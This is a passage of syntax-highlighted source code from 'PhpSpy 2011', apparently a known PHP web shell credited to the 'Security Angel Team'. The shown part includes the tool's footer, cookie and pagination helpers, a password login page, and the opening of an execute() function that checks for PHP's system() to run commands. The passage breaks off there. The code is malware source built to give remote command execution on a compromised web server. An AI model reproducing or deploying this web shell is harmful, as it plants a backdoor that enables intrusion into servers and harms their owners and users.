&lt;div style=<span style="color: #8abeb7;">"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;</span><span style="color: #8abeb7; text-decoration: underline;">background:#eee;"</span><span style="text-decoration: underline;">&gt;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   &lt;span style=<span style="color: #8abeb7;">"float:right;"</span>&gt;<span style="color: #b294bb;">&lt;?</span>php debuginfo();ob_end_flush();<span style="color: #b294bb;">?&gt;</span>&lt;/span&gt;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   Powered by &lt;a title=<span style="color: #8abeb7;">"Build 20110502"</span> href=<span style="color: #8abeb7;">"http://www.4ngel.net"</span> target=<span style="color: #8abeb7;">"_bl</span><span style="color: #8abeb7; text-decoration: underline;">ank"</span><span style="text-decoration: underline;">&gt;</span><span style="color: #b294bb; text-decoration: underline;">&lt;?</span><span style="text-decoration: underline;">php </span><span style="color: #b5bd68; text-decoration: underline;">echo</span><span style="text-decoration: underline;"> str_replace(</span><span style="color: #8abeb7; text-decoration: underline;">'.'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">''</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'P.h.p.S.p.y'</span><span style="text-decoration: underline;">);</span><span style="color: #b294bb; text-decoration: underline;">?&gt;</span><span style="text-decoration: underline;"> 2011&lt;/a&gt;. Copyright (C) 2004-2011 &lt;a href=</span><span style="color: #8abeb7; text-decoration: underline;">"http://www.4ngel.net"</span><span style="text-decoration: underline;"> target=</span><span style="color: #8abeb7; text-decoration: underline;">"_blank"</span><span style="text-decoration: underline;">&gt;Security Angel Team [</span><span style="color: #81a2be; text-decoration: underline;">S4T</span><span style="text-decoration: underline;">]&lt;/a&gt; All Rights Reserved.</span>
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;

<span style="color: #b294bb;">&lt;?php</span>

<span style="color: #969896; font-style: italic;">/*</span><span style="color: #969896; font-style: italic;">======================================================</span>
<span style="color: #969896; font-style: italic;">&#20989;&#25968;&#24211;</span>
<span style="color: #969896; font-style: italic;">======================================================*/</span>

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">secparam</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">n</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">v</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">v</span> = trim(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">v</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">v</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;h2&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">n</span>.<span style="color: #8abeb7;">' &amp;raquo;&lt;/h2&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;div class="infolist"&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(strpos(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">v</span>, <span style="color: #8abeb7;">"\n"</span>) === <span style="color: #81a2be;">false</span>)
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">v</span>.<span style="color: #8abeb7;">'&lt;br /&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">else</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;pre&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">v</span>.<span style="color: #8abeb7;">'&lt;/pre&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;/div&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">m</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">msg</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">echo</span> <span style="color: #8abeb7;">'&lt;div style="margin:10px auto 15px auto;background:#ffffe0;border:1px s</span><span style="color: #8abeb7; text-decoration: underline;">olid #e6db55;padding:10px;font:14px;text-align:center;font-weight:bold;"&gt;'</span><span style="text-decoration: underline;">;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">echo</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">msg</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">echo</span> <span style="color: #8abeb7;">'&lt;/div&gt;'</span>;
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">scookie</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">key</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">value</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">life</span> = 0, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">prefix</span> = 1) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">global</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">timestamp</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_SERVER</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">cookiepre</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">cookiedomain</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">cookiepath</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">cookie</span><span style="color: #f0c674; text-decoration: underline;">life</span><span style="text-decoration: underline;">;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">key</span> = (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">prefix</span> ? <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">cookiepre</span> : <span style="color: #8abeb7;">''</span>).<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">key</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">life</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">life</span> ? <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">life</span> : <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">cookielife</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">useport</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_SERVER</span>[<span style="color: #8abeb7;">'SERVER_PORT'</span>] == 443 ? 1 : 0;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   setcookie(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">key</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">value</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">timestamp</span>+<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">life</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">cookiepath</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">cookiedomain</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">usepo</span><span style="color: #f0c674; text-decoration: underline;">rt</span><span style="text-decoration: underline;">);</span>
}<span style="color: #de935f; background-color: #373b41;">   </span>
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">multi</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">num</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">perpage</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">curpage</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tablename</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">multipage</span> = <span style="color: #8abeb7;">''</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">num</span> &gt; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">perpage</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">page</span> = 10;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">offset</span> = 5;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pages</span> = <span style="color: #81a2be;">@ceil</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">num</span> / <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">perpage</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">page</span> &gt; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pages</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">from</span> = 1;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">to</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pages</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">from</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">curpage</span> - <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">offset</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">to</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">curpage</span> + <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">page</span> - <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">offset</span> - 1;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">from</span> &lt; 1) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">to</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">curpage</span> + 1 - <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">from</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">from</span> = 1;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>((<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">to</span> - <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">from</span>) &lt; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">page</span> &amp;&amp; (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">to</span> - <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">from</span>) &lt; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pages</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">to</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">page</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">elseif</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">to</span> &gt; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pages</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">from</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">curpage</span> - <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pages</span> + <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">to</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">to</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pages</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>((<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">to</span> - <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">from</span>) &lt; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">page</span> &amp;&amp; (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">to</span> - <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">from</span>) &lt; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pages</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">from</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pages</span> - <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">page</span> + 1;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">multipage</span> = (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">curpage</span> - <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">offset</span> &gt; 1 &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pages</span> &gt; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">page</span> ? <span style="color: #8abeb7;">'&lt;a href="javas</span><span style="color: #8abeb7; text-decoration: underline;">cript:settable(\''</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'\', \'\', 1);"&gt;First&lt;/a&gt; '</span><span style="text-decoration: underline;"> : </span><span style="color: #8abeb7; text-decoration: underline;">''</span><span style="text-decoration: underline;">).(</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">curpage</span><span style="text-decoration: underline;"> &gt; 1 ? </span><span style="color: #8abeb7; text-decoration: underline;">'&lt;a href="javascript:settable(\''</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'\', \'\', '</span><span style="text-decoration: underline;">.(</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">curpage</span><span style="text-decoration: underline;"> - 1).</span><span style="color: #8abeb7; text-decoration: underline;">');"&gt;Prev&lt;/a&gt; '</span><span style="text-decoration: underline;"> : </span><span style="color: #8abeb7; text-decoration: underline;">''</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">for</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">i</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">from</span>; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">i</span> &lt;= <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">to</span>; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">i</span>++) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">multipage</span> .= <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">i</span> == <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">curpage</span> ? <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">i</span>.<span style="color: #8abeb7;">' '</span> : <span style="color: #8abeb7;">'&lt;a href="javascript:settabl</span><span style="color: #8abeb7; text-decoration: underline;">e(\''</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'\', \'\', '</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">i</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">');"&gt;['</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">i</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">']&lt;/a&gt; '</span><span style="text-decoration: underline;">;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">multipage</span> .= (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">curpage</span> &lt; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pages</span> ? <span style="color: #8abeb7;">'&lt;a href="javascript:settable(\''</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">ta</span><span style="color: #f0c674; text-decoration: underline;">blename</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'\', \'\', '</span><span style="text-decoration: underline;">.(</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">curpage</span><span style="text-decoration: underline;"> + 1).</span><span style="color: #8abeb7; text-decoration: underline;">');"&gt;Next&lt;/a&gt;'</span><span style="text-decoration: underline;"> : </span><span style="color: #8abeb7; text-decoration: underline;">''</span><span style="text-decoration: underline;">).(</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">to</span><span style="text-decoration: underline;"> &lt; </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">pages</span><span style="text-decoration: underline;"> ? </span><span style="color: #8abeb7; text-decoration: underline;">' &lt;a href="javascript:settable(\''</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'\', \'\', '</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">pages</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">');"&gt;Last&lt;/a&gt;'</span><span style="text-decoration: underline;"> : </span><span style="color: #8abeb7; text-decoration: underline;">''</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">multipage</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">multipage</span> ? <span style="color: #8abeb7;">'&lt;p&gt;Pages: '</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">multipage</span>.<span style="color: #8abeb7;">'&lt;/p&gt;'</span> : <span style="color: #8abeb7;">''</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">multipage</span>;
}
<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#30331;&#38470;&#20837;&#21475;</span>
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">loginpage</span>() {
<span style="color: #b294bb;">?&gt;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   &lt;style type=<span style="color: #8abeb7;">"text/css"</span>&gt;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   input {<span style="color: #81a2be;">font</span>:11px Verdana;<span style="color: #81a2be;">BACKGROUND</span>: <span style="color: #969896; font-style: italic;">#FFFFFF;height: 18px;border: 1px solid </span><span style="color: #969896; font-style: italic; text-decoration: underline;">#666666;}</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   &lt;/style&gt;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   &lt;form method=<span style="color: #8abeb7;">"POST"</span> action=<span style="color: #8abeb7;">""</span>&gt;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   &lt;span style=<span style="color: #8abeb7;">"font:11px Verdana;"</span>&gt;Password: &lt;/span&gt;&lt;input name=<span style="color: #8abeb7;">"password"</span> typ<span style="text-decoration: underline;">e=</span><span style="color: #8abeb7; text-decoration: underline;">"password"</span><span style="text-decoration: underline;"> size=</span><span style="color: #8abeb7; text-decoration: underline;">"20"</span><span style="text-decoration: underline;">&gt;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   &lt;input type=<span style="color: #8abeb7;">"hidden"</span> name=<span style="color: #8abeb7;">"action"</span> value=<span style="color: #8abeb7;">"login"</span>&gt;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   &lt;input type=<span style="color: #8abeb7;">"submit"</span> value=<span style="color: #8abeb7;">"Login"</span>&gt;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   &lt;/form&gt;
<span style="color: #b294bb;">&lt;?php</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">exit</span>;
}<span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">end loginpage()</span>

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">execute</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">cfe</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">res</span> = <span style="color: #8abeb7;">''</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">cfe</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(function_exists(<span style="color: #8abeb7;">'system'</span>)) {
